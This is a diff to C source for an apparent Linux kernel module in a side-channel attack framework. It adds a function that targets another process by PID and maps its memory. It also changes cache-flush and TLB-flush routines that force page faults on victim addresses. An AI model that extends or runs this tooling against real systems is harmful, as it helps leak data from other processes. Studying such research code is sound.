@@ -114,6 +114,38 @@ void setup_nuke_structs(struct attack_info *info, uint64_t address) {
          (uint64_t *)paddr);
 }
 
+void setup_nuke_structs_with_pid(struct attack_info *info, uint64_t address, pid_t pid) {
+  int ret = 0;
+  spinlock_t *ptlp;
+  pte_t *ptep;
+  uint64_t paddr;
+
+  struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID); 
+  info->nuke_addr = address;
+  info->nuke_tsk = task;
+  info->nuke_pid = task->pid;
+  info->nuke_mm = task->mm;
+
+  ret = map_general_address(info->nuke_tsk, info->nuke_mm, info->nuke_addr, 0,
+                            &(info->nuke_kaddr));
+  if (ret <= 0 || (uint64_t)info->nuke_kaddr == 0) {
+    printk(KERN_INFO "setup_nuke_structs: Mapping nuke address failed\n");
+    info->error = 1;
+    return;
+  }
+#ifdef DEBUG
+  printk(KERN_INFO "setup_nuke_structs: Mapped nuke_addr %p -> nuke_kaddr %p\n",
+         (uint64_t *)info->nuke_addr, info->nuke_kaddr);
+#endif
+
+  map_pgt_4level_lock(info, &ptlp);
+  pte_unmap_unlock(info->nuke_ptep, ptlp);
+
+  paddr = get_physical(info->nuke_mm, address, &ptep, &ptlp, 1);
+  printk(KERN_INFO "Physical address of nuke %p -> %p\n", (uint64_t *)info->nuke_addr,
+         (uint64_t *)paddr);
+}
+
 void setup_monitor_structs(struct attack_info *info, uint64_t address, uint32_t index) {
   int ret = 0;
   spinlock_t *ptlp;
@@ -148,7 +180,7 @@ void setup_monitor_structs(struct attack_info *info, uint64_t address, uint32_t 
 }
 
 void pf_prep(struct attack_info *info, uint64_t address, uint32_t tot_monitor) {
-  int ret = 0, i = 0;
+  int ret = 0;
   uint64_t old_time = 0, wait_time = 0;
   pte_t *ptep;
   spinlock_t *ptl;
@@ -162,7 +194,7 @@ void pf_prep(struct attack_info *info, uint64_t address, uint32_t tot_monitor) {
   }
 
   // perform a nuke on the address and prepare a minor page fault
-  ret = nuke_lock(info->nuke_mm, address, &ptep, &ptl, 1);
+  ret = nuke_lock(info->nuke_mm, address, info->nuke_kaddr, &ptep, &ptl, 1);
   if (ret) {
     info->error = 1;
     return;
@@ -199,7 +231,7 @@ void pf_prep_no_monitor_flush(struct attack_info *info, uint64_t address) {
   }
   printk(KERN_INFO "pf_prep_no_monitor_flush: Preparing minor page fault\n");
   // perform a nuke on the address and prepare a minor page fault
-  ret = nuke_lock(info->nuke_mm, address, &ptep, &ptl, 1);
+  ret = nuke_lock(info->nuke_mm, address, info->nuke_kaddr, &ptep, &ptl, 1);
   if (ret) {
     info->error = 1;
     return;
@@ -226,7 +258,7 @@ void pf_prep_lockless(struct attack_info *info, uint64_t address) {
   }
 
   // perform a nuke on the address and prepare a minor page fault
-  ret = nuke_lockless(info->nuke_mm, address, &ptep, 1);
+  ret = nuke_lockless(info->nuke_mm, address, info->nuke_kaddr, &ptep, 1);
   if (ret) {
     info->error = 1;
     return;
@@ -240,10 +272,9 @@ void pf_prep_lockless(struct attack_info *info, uint64_t address) {
 }
 
 void pf_redo(struct attack_info *info, uint64_t address) {
-  int ret = 0, i = 0;
+  int ret = 0;
   uint64_t old_time = 0, wait_time = 0;
   pte_t *ptep;
-  spinlock_t *ptl;
 
   // perform a partial nuke on the address
   ret = nuke_lockless_partial(info->nuke_mm, address, &ptep, 1);
@@ -414,8 +445,8 @@ out:
   return -EINVAL;
 }
 
-int nuke_lock(struct mm_struct *mm, uint64_t address, pte_t **ptepp, spinlock_t **ptlp,
-              int present) {
+int nuke_lock(struct mm_struct *mm, uint64_t address, void *kernel_address, 
+              pte_t **ptepp, spinlock_t **ptlp, int present) {
   pgd_t *pgd;
   pud_t *pud;
   pmd_t *pmd;
@@ -462,7 +493,7 @@ int nuke_lock(struct mm_struct *mm, uint64_t address, pte_t **ptepp, spinlock_t 
   }
 
   // flush data
-  asm_clflush(address);
+  clflush(kernel_address);
 
   // flush page tables
   clflush(ptep);
@@ -471,7 +502,7 @@ int nuke_lock(struct mm_struct *mm, uint64_t address, pte_t **ptepp, spinlock_t 
   clflush(pgd);
 
   // flush tlb
-  __flush_tlb_single(address);
+  __flush_tlb_single((uint64_t)kernel_address);
 
   pte_unmap_unlock(ptep, *ptlp);
 
@@ -482,7 +513,8 @@ out:
   return -EINVAL;
 }
 
-int nuke_lockless(struct mm_struct *mm, uint64_t address, pte_t **ptepp, int present) {
+int nuke_lockless(struct mm_struct *mm, uint64_t address, void *kernel_address, 
+                  pte_t **ptepp, int present) {
   pgd_t *pgd;
   pud_t *pud;
   pmd_t *pmd;
@@ -531,7 +563,7 @@ int nuke_lockless(struct mm_struct *mm, uint64_t address, pte_t **ptepp, int pre
   }
 
   // flush data
-  asm_clflush(address);
+  clflush(kernel_address);
 
   // flush page tables
   clflush(ptep);
@@ -540,7 +572,7 @@ int nuke_lockless(struct mm_struct *mm, uint64_t address, pte_t **ptepp, int pre
   clflush(pgd);
 
   // flush tlb
-  __flush_tlb_single(address);
+  __flush_tlb_single((uint64_t)kernel_address);
 
   return 0;
 out:
